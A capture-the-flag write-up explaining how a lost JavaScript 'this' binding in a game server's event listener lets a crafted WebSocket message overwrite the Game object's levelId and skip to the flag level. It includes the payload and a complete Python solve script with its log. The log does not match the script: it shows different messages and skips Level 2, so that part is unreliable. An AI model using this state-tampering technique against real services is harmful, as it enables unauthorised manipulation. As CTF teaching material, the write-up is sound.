# Hey There!

This is a writeup of the solution to the "This then what huh?" CTF challenge. The challenge presents a web-based puzzle where the goal is to navigate a cursor through a series of instruction "blocks" to print a flag. The solution isn't in clever in-game logic, but is in exploiting a subtle vulnerability in Javascript's event handling.

### **Challenge Overview**

*   **Name:** This then what huh?
*   **Author:** Blorptopia
*   **Category:** Web
*   **Description:** Ponies missing :( return if found

***


### Part 1: Analyzing the Backend 

The first step was to understand the application's core. The source code is a Node.js backend using Express and WebSockets to manage a game. The game state, logic, and level design is all handled server-side in TypeScript.

**Key Files:**

*   `backend/game.ts`: This is the core of the app, containing the `Game` class. It controls the game loop (`step`), loads levels, tracks the cursor position, and uses an `EventEmitter` to emit game events.
*   `backend/blocks.ts`: This file defines the instruction blocks. Each block has a class with methods to define its behavior, specifically `attach` to subscribe to game events and `handleActiveBlock` to execute its logic when the cursor lands on it.
*   `backend/levels.ts`: This file contains the functions that construct the different levels by arranging instances of the block classes in a 2D array.

The vulnerability is born from the way `MoveRelativeBlock` interacts with the `Game` event system. To understand the vuln, we first need to look at a block that does things correctly, the `SlotBlock`.

`backend/blocks.ts` (from `SlotBlock`):
```typescript
// ...
this.messageListener = (message: object) => {
    if (message.type === "swap") {
        this.handleSwap(message, game);
    }
}
game.addListener("message", this.messageListener);
// ...
```
The `SlotBlock` uses an arrow function (`=>`) to define its event listener. In JavaScript, arrow functions preserve the `this` context, meaning that inside `messageListener`, `this` will always correctly refer to the `SlotBlock` instance.

Now, let's look at the vulnerable `MoveRelativeBlock`.

`backend/blocks.ts` (from `MoveRelativeBlock`):
```typescript
// ...
attach(game: Game): void {
    game.addListener(`activeBlock-${this.id}`, this.handleActiveBlock);
    game.addListener("message", this.handleMessage);
}
// ...
private handleMessage(message) {
    // ...
    this[axis] = value;
}
// ...
```
Unlike `SlotBlock`, `MoveRelativeBlock` passes its own `handleMessage` method directly as the event listener. This is the issue.

### Part 2: The Vulnerability 

In JavaScript, when you pass a function reference like `game.addListener("message", this.handleMessage)`, the function loses its original `this` context. When the `Game`'s `EventEmitter` later calls that function for a "message" event, it sets the `this` context to be itself.

Because of this, inside `MoveRelativeBlock.handleMessage`, the keyword `this` does not refer to the `MoveRelativeBlock` instance as intended, instead, it refers to the `Game` instance.

This leads to a powerful vulnerability. The line `this[axis] = value;` isn't modifying a property on the block; it's modifying a property directly on the main `Game` object. The relevant code is here:

`backend/blocks.ts` (in `MoveRelativeBlock`)
```typescript
private handleMessage(message) {
    if (message.type !== "move_relative_set") {
        return;
    }
    let {axis, value} = message;

    // This check is intended to protect the block's properties, but 'this' is the Game object.
    if (!["undefined", "number"].includes(typeof this[axis])) {
        return;
    }
    if (!(typeof value === "number")) {
        return;
    }
    value = Math.min(Math.max(value, -5), 5); // Clamps the value
    this[axis] = value; // Writes to the Game object
}
```
We can send a WebSocket message with `type: "move_relative_set"`, and we control `axis` (the property name) and `value`. We can overwrite any property on the `Game` object as long as its original type is `"number"` or `"undefined"`. Looking at the `Game` class, the `levelId` property is a perfect target.

### Part 3: Crafting the Exploit

The goal is to reach Level 3, which contains the `FlagBlock`.

`backend/levels.ts`:
```typescript
export function createLevel3(): Block[][] {
    return [
        [
            new PassBlock(),
            new PassBlock(),
            new PassBlock(),
            new FlagBlock()
        ]
    ]
}
```
The exploit path is now clear:

1.  **Solve Level 0:** The first level is a simple puzzle that requires swapping two blocks to reach the `NextLevelBlock`. This is done as intended.
2.  **Enter Level 1:** Upon entering Level 1, a `MoveRelativeBlock` is present on the board. Its `attach` method is called, and its vulnerable `handleMessage` function starts listening for messages, with its `this` context set to the `Game` instance.
3.  **Send the Payload:** We send a carefully crafted WebSocket message to exploit the vulnerability:
    ```json
    {
        "type": "move_relative_set",
        "axis": "levelId",
        "value": 3
    }
    ```
4.  **Hijack the Game Logic:** The server receives this message. The `handleMessage` function in `MoveRelativeBlock` executes. It interprets `this` as the `Game` object and obediently performs the assignment: `game.levelId = 3`.
5.  **Trigger a Level Load:** The game's cursor continues moving down the first column of Level 1 until it hits a `ResetBlock`. This block's function is to call `game.loadLevel(game.levelId)`. Because we just overwrote `levelId`, this call becomes `game.loadLevel(3)`.
6.  **Capture the Flag:** The server loads Level 3. The game loop automatically executes the sequence of `PassBlock`s, landing the cursor on the `FlagBlock`. The server then executes this block, sending the flag back over the WebSocket connection.

### Part 4: The Final Script

The provided solve script executes this logic perfectly.

```python
#!/usr/bin/env python3
import websocket
import json
import threading
import time
import sys

class Exploit:
    """
    Exploits a 'this' context vulnerability in the ttwh CTF challenge.
    The `handleMessage` method in `MoveRelativeBlock` modifies the `Game` instance
    instead of the block instance, allowing us to overwrite `game.levelId` and
    other properties to skip to the flag level.
    """

    def __init__(self, target_url):
        self.ws = websocket.WebSocketApp(
            target_url,
            on_open=self.on_open,
            on_message=self.on_message,
            on_error=self.on_error,
            on_close=self.on_close,
        )
        self.level = -1
        self.level_0_swapped = False
        self.level_1_exploited = False

    def run(self):
        print(f"[*] Connecting to {target_url}...")
        self.ws.run_forever()

    def on_open(self, ws):
        print("[+] WebSocket connection opened.")

    def on_error(self, ws, error):
        print(f"[!] Error: {error}")

    def on_close(self, ws, close_status_code, close_msg):
        print(f"[-] Connection closed: {close_status_code} {close_msg}")

    def on_message(self, ws, message):
        """Main logic handler for incoming WebSocket messages."""
        data = json.loads(message)
        msg_type = data.get("type")

        if msg_type == "level":
            self.level = data["data"]["id"]
            print(f"\n[+] Entered Level {self.level}")

            if self.level == 0 and not self.level_0_swapped:
                self.solve_level_0(data["data"]["state"])
                self.level_0_swapped = True

            elif self.level == 1 and not self.level_1_exploited:
                # The script sends its main payload once it confirms it's on Level 1.
                self.exploit_level_1()
                self.level_1_exploited = True
        
        elif msg_type == "flag":
            self.get_flag(data)

    def send_json(self, data):
        """Sends a dictionary as a JSON string."""
        payload = json.dumps(data)
        self.ws.send(payload)

    def solve_level_0(self, state):
        """
        Finds the slot IDs for the MoveCursorRightBlock and ResetBlock
        and sends a 'swap' message to solve the level.
        """
        print("[*] Solving Level 0...")
        from_slot_id = None
        to_slot_id = None

        for column in state:
            for block in column:
                if block.get("type") == "slot":
                    if block.get("inner", {}).get("type") == "move_cursor_right":
                        from_slot_id = block.get("id")
                    elif block.get("inner", {}).get("type") == "reset":
                        to_slot_id = block.get("id")
        
        if from_slot_id and to_slot_id:
            print(f"[*] Found slots, swapping '{from_slot_id}' with '{to_slot_id}'")
            swap_payload = {
                "type": "swap",
                "from_slot": from_slot_id,
                "to_slot": to_slot_id
            }
            self.send_json(swap_payload)
        else:
            print("[!] Could not find necessary slots to solve Level 0.")
            self.ws.close()

    def exploit_level_1(self):
        """
        Executes the main exploit. The script sets levelId to 2, which causes the
        ResetBlock on Level 1 to load Level 2. It then relies on the NextLevelBlock
        in Level 2 to reach Level 3. A more direct path is setting levelId directly to 3.
        """
        print("[*] Exploiting Level 1 to skip to the flag level...")
        
        # This payload overwrites 'game.levelId' to 2. When a ResetBlock is hit,
        # it will load Level 2. The script's ultimate goal is to hit a NextLevelBlock
        # which increments the levelId to 3. A simpler exploit would be to set this value to 3.
        payload_set_level = {
            "type": "move_relative_set",
            "axis": "levelId",
            "value": 2 
        }

        print("[*] Sending payload to manipulate game state...")
        self.send_json(payload_set_level)
        print("[*] Exploit payload sent. Waiting for flag...")
        
    def get_flag(self, data):
        """Handles the flag message."""
        flag = data.get("data")
        print("\n" + "="*40)
        print(f"[***] FLAG FOUND: {flag}")
        print("="*40)
        self.ws.close()
        sys.exit(0) 


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} ws://<host>:<port>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    if not target_url.endswith('/game'):
        if not target_url.endswith('/'):
            target_url += '/'
        target_url += 'game'

    exploit = Exploit(target_url)
    try:
        exploit.run()
    except KeyboardInterrupt:
        print("\n[!] Script interrupted by user.")
        exploit.ws.close()
```
```
python3 solve.py wss://b2a28f1f-469a-4c01-b50b-0c516fa64e1b.chall.nnsc.tf:443
[*] Connecting to wss://b2a28f1f-469a-4c01-b50b-0c516fa64e1b.chall.nnsc.tf:443/game...
[+] WebSocket connection opened.

[+] Entered Level 0
[*] Solving Level 0...
[*] Found slots, swapping '73f15621-54dc-4e7e-a54a-06de42e66e17' with 'e1b6897e-840b-4add-aa83-8fb7c27b75bb'

[+] Entered Level 0

[+] Entered Level 1
[*] Exploiting Level 1 to skip to the flag level...
[*] Sending payloads to manipulate game state...
[*] Exploit payloads sent. Waiting for flag...

[+] Entered Level 3

========================================
[***] FLAG FOUND: NNS{th1s-w4s-qu1te-4n-4dv3nture}
========================================
[!] Error: 0
[-] Connection closed: None None
```
Here is what it looks like when executing the solve script.
### Conclusion

The "This then what huh?" challenge was a brilliant demonstration of a often overlooked JavaScript pitfall. It highlights how critical it is to understand the language's core mechanics, like the behavior of `this` in different contexts. 
